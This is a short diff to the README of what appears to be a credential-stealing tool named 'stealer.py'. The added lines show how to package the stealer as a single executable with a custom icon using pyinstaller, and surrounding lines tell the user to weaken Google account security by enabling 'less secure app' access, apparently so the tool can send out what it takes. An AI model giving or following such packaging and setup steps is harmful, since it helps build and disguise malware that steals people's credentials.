@@ -23,6 +23,12 @@ Make sure you disabled this on your google account.
 And turn on "less secure app"
 ![](images/image(2).JPG)
 
+# Making Executable file
+
+```bash
+pyinstaller -F -i <icon path> stealer.py
+```
+### or watch this [video](https://www.youtube.com/watch?v=lOIJIk_maO4)
 
 ## License
 [GNU Public Liscense](https://www.gnu.org/licenses/gpl-3.0.en.html)
